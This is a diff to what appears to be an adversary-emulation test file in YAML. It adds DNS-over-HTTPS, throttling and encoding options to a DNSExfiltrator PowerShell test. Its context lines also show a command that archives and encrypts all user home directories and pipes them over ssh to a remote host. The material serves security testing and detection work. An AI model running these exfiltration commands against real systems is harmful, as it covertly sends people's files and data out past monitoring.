@@ -49,9 +49,10 @@ atomic_tests:
     command: |
       tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'
     name: sh
-- name: DNSExfiltration
+- name: DNSExfiltration (doh)
   description: |
     DNSExfiltrator allows for transfering (exfiltrate) a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.
+    !!! Test will fail without a domain under your control with A record and NS record !!! 
     See this github page for more details - https://github.com/Arno0x/DNSExfiltrator
   supported_platforms:
   - windows
@@ -68,6 +69,18 @@ atomic_tests:
       description: DNSExfiltrator powershell ps_module
       type: Path
       default: '$env:Temp\dnsexfil.ps1'
+    doh:
+      description: doh provider
+      type: String
+      default: google
+    time:
+      description: throttle time
+      type: String
+      default: 500
+    encoding:
+      description: Optional b32 encoding
+      type: String
+      default: 
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -79,5 +92,5 @@ atomic_tests:
   executor:
     command: |
       Import-Module #{ps_module}
-      Invoke-DNSExfiltrator -i #{ps_module} -d #{domain} -p #{password}
+      Invoke-DNSExfiltrator -i #{ps_module} -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}
     name: powershell
